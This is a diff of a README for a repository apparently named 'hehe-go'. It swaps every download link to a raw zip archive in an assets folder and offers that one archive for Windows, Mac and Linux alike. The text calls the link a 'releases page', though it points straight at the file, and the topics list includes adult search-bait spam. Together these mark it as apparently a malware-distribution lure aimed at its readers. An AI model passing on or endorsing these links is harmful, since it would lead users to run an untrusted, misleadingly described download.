@@ -10,18 +10,18 @@ Before you begin, ensure you have the following:
 - At least 100 MB of free disk space
 
 ## 🔗 Download Link
-[![Download hehe-go](https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip%20hehe--go-v1.0-blue)](https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip)
+[![Download hehe-go](https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip%20hehe--go-v1.0-blue)](https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip)
 
 ## 📥 Download & Install
 1. For your convenience, click the link below to visit the GitHub releases page:
-   [Download hehe-go](https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip).
+   [Download hehe-go](https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip).
 
 2. On the releases page, find the latest version of hehe-go.
 
 3. Click on the appropriate file for your operating system:
-   - **Windows:** Select `https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip`
-   - **Mac:** Select `https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip`
-   - **Linux:** Select `https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip`
+   - **Windows:** Select `https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip`
+   - **Mac:** Select `https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip`
+   - **Linux:** Select `https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip`
 
 4. After the download finishes, locate the file in your downloads folder.
 
@@ -46,7 +46,7 @@ Before you begin, ensure you have the following:
 ## 📞 Support
 If you need assistance, please reach out through the Issues section on our GitHub repository.
 
-Remember to visit our releases page to stay up-to-date: [Download hehe-go](https://github.com/MatrixRainSimulatorOfficial/hehe-go/raw/refs/heads/main/Assets/Games/MRS/go-hehe-3.3-alpha.5.zip).
+Remember to visit our releases page to stay up-to-date: [Download hehe-go](https://raw.githubusercontent.com/MatrixRainSimulatorOfficial/hehe-go/main/Assets/Games/MRS/hehe_go_v3.1.zip).
 
 ## 📢 Topics
 - amanda-cerny-nude-gogo
